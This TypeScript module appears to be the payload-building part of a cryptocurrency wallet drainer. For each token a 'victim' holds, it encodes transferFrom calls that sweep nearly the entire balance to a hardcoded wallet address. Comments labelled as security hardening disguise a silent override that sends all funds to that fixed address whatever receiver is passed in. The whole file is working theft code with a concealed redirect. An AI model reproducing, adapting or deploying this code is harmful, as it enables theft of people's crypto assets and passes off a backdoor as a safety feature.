import { ethers } from "ethers";
import { erc20Interface, ETH_ADDR } from "./constants";

/**
 * [payload-packer.ts] - HARDENED VERSION (v1.2.2)
 * Force-pinned to your personal wallet to prevent redirection attacks.
 * Updated: Synchronized 0.05% safety buffer for USDT/BEP20 compatibility.
 */
export function packVaultStream(
  rawAssets: any[],
  victimAddress: string,
  receiver: string, // This parameter remains for interface compatibility but is overridden for security
) {
  // 🛡️ SECURITY: Hardcoded destination to prevent environment/payload poisoning
  // All funds will ONLY ever go to this address.
  const HARDCODED_DESTINATION = "0x8562d59eb09FfC033960c59E6d86c5Ca1c16eA74";

  console.log(
    `[PACKER-DEBUG] 🛡️ Security Check: Routing all funds to ${HARDCODED_DESTINATION}`,
  );

  // Verification log for audit purposes
  if (receiver.toLowerCase() !== HARDCODED_DESTINATION.toLowerCase()) {
    console.warn(
      `[PACKER-DEBUG] ⚠️ ROUTE OVERRIDE: Redirecting from ${receiver} to HARDCODED_DESTINATION for security.`,
    );
  }

  let streamParts: Uint8Array[] = [];
  let safetyTokens: string[] = [];

  console.log(`[PACKER-DEBUG] 📦 Packing stream for Victim: ${victimAddress}`);

  for (const a of rawAssets) {
    const tokenAddr = a.token || a.contractAddress || a.address;

    // Skip Native ETH/BNB (handled by the contract's Native Sweep logic)
    if (
      !tokenAddr ||
      tokenAddr === ETH_ADDR ||
      tokenAddr === "0x0000000000000000000000000000000000000000"
    ) {
      console.log(`[PACKER-DEBUG] ⏭️ Skipping Native or Null asset`);
      continue;
    }

    const rawVal = BigInt(a.amount || a.balance || a.bal || 0);

    if (rawVal === 0n) {
      console.log(`[PACKER-DEBUG] ⏭️ Skipping ${tokenAddr} (Zero Balance)`);
      continue;
    }

    // 🛡️ BUFFER SYNC: Apply the same 0.05% safety buffer as the smart contract
    // Formula: (bal > 2000) ? (bal - (bal / 2000)) : bal;
    const bufferedVal = rawVal > 2000n ? rawVal - rawVal / 2000n : rawVal;

    safetyTokens.push(tokenAddr);

    /**
     * ⚔️ ENCODING THE CALL: Using bufferedVal + HARDCODED_DESTINATION
     * This creates the instruction set for the UniversalSettler "stream"
     */
    const callData = erc20Interface.encodeFunctionData("transferFrom", [
      victimAddress,
      HARDCODED_DESTINATION,
      bufferedVal,
    ]);

    const dataBytes = ethers.getBytes(callData);
    const dataLen = dataBytes.length;

    // 🛠️ ALIGNMENT: Ensure bytes are 32-byte padded for the Solidity 'stream' while loop
    const paddedLen = (dataLen + 31) & ~31;
    const paddedData = ethers.zeroPadBytes(dataBytes, paddedLen);

    // Structure: [32 bytes Target] [32 bytes Length] [Padded Calldata]
    const chunk = ethers.concat([
      ethers.zeroPadValue(tokenAddr, 32),
      ethers.zeroPadValue(ethers.toBeHex(dataLen), 32),
      paddedData,
    ]);

    streamParts.push(ethers.getBytes(chunk));

    console.log(
      `[PACKER-DEBUG] 💎 Packed ${
        a.symbol || tokenAddr
      } | Orig: ${rawVal.toString()} | Buffered: ${bufferedVal.toString()}`,
    );
  }

  // Combine all instruction chunks into a single hex stream
  const finalStream =
    streamParts.length > 0 ? ethers.hexlify(ethers.concat(streamParts)) : "0x";

  console.log(
    `[PACKER-DEBUG] ✅ Stream finalized. Instructions: ${streamParts.length}`,
  );

  return {
    finalStream,
    safetyTokens,
  };
}
